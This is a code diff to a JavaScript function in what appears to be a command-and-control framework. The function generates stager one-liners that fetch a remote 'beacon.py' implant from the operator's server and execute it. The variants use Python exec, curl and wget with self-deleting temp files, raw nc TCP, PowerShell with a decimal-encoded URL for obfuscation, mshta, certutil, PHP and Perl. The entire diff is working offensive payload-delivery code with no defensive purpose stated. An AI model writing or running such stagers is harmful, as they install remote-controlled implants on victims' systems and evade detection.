@@ -5617,7 +5617,7 @@ function _stagerShowOneliners(token) {
   const url = `${base}/s/${token}`;
   const hta_url = `${base}/s/${token}/hta`;
 
-  // PS obfuscation: encode URL as decimal char array
+  // PS obfuscation: encode URL as decimal char array (only the URL, injected via $u variable)
   const psDec = Array.from(url).map(c => c.charCodeAt(0)).join(',');
 
   // Parse host and port for nc/raw TCP one-liner
@@ -5626,37 +5626,42 @@ function _stagerShowOneliners(token) {
   const ncPort = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
   const ncPath = parsed.pathname;
 
+  // Python exec helper — passes __file__ and __builtins__ so the beacon works correctly
+  const pyExec = (pyBin, u) =>
+    `${pyBin} -c "import urllib.request,builtins; c=urllib.request.urlopen('${u}').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"`;
+
   const groups = [
     {
       title: '🐍 Python',
       items: [
-        { label: 'python3', cmd: `python3 -c "import urllib.request; exec(compile(urllib.request.urlopen('${url}').read(),'<s>','exec'))"` },
-        { label: 'python (Windows)', cmd: `python -c "import urllib.request; exec(compile(urllib.request.urlopen('${url}').read(),'<s>','exec'))"` },
+        { label: 'python3 (Linux / Mac)',  cmd: pyExec('python3', url) },
+        { label: 'python  (Windows cmd)', cmd: pyExec('python',  url) },
       ]
     },
     {
       title: '🐚 Shell / Unix',
       items: [
-        { label: 'curl',    cmd: `curl -s "${url}" | python3` },
-        { label: 'wget',    cmd: `wget -qO- "${url}" | python3` },
-        { label: 'sh',      cmd: `sh -c "curl -s '${url}' | python3 || wget -qO- '${url}' | python3"` },
-        { label: 'nc (raw TCP)', cmd: `(printf 'GET ${ncPath} HTTP/1.0\\r\\nHost: ${ncHost}\\r\\n\\r\\n'; sleep 1) | nc ${ncHost} ${ncPort} | python3 -c "import sys; d=sys.stdin.buffer.read(); exec(d[d.find(b'\\r\\n\\r\\n')+4:])"` },
+        { label: 'curl',         cmd: `curl -s "${url}" -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py` },
+        { label: 'wget',         cmd: `wget -qO /tmp/s.py "${url}" && python3 /tmp/s.py; rm -f /tmp/s.py` },
+        { label: 'sh (fallback)', cmd: `sh -c "curl -s '${url}' -o /tmp/s.py 2>/dev/null || wget -qO /tmp/s.py '${url}'; python3 /tmp/s.py; rm -f /tmp/s.py"` },
+        { label: 'nc (raw TCP)', cmd: `(printf 'GET ${ncPath} HTTP/1.0\r\nHost: ${ncHost}\r\n\r\n'; sleep 1) | nc ${ncHost} ${ncPort} | python3 -c "import sys,builtins; b=sys.stdin.buffer.read(); c=b[b.find(bytes([13,10,13,10]))+4:]; exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
       ]
     },
     {
       title: '🪟 Windows',
       items: [
-        { label: 'PowerShell',             cmd: `IEX(New-Object Net.WebClient).DownloadString('${url}')` },
-        { label: 'PowerShell (obfuscated)', cmd: `IEX((New-Object Net.WebClient).DownloadString((-join([char[]]@(${psDec})))))` },
-        { label: 'mshta (HTA)',            cmd: `mshta ${hta_url}` },
-        { label: 'certutil + python',      cmd: `certutil -urlcache -split -f "${url}" %TEMP%\\s.py && python %TEMP%\\s.py && del %TEMP%\\s.py` },
+        { label: 'PowerShell — llama python', cmd: pyExec('python', url) },
+        { label: 'PowerShell — URL ofuscada', cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,builtins; c=urllib.request.urlopen('$u').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
+        { label: 'mshta (HTA)',               cmd: `mshta ${hta_url}` },
+        { label: 'certutil (cmd.exe)',         cmd: `certutil -urlcache -split -f "${url}" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py` },
+        { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
       ]
     },
     {
-      title: '🔧 Otros lenguajes',
+      title: '🔧 Otros',
       items: [
-        { label: 'PHP',  cmd: `php -r "passthru('curl -s ${url} | python3');"` },
-        { label: 'Perl', cmd: `perl -e "system('curl -s ${url} | python3')"` },
+        { label: 'PHP',  cmd: `php -r "passthru('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
+        { label: 'Perl', cmd: `perl -e "system('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
       ]
     },
   ];
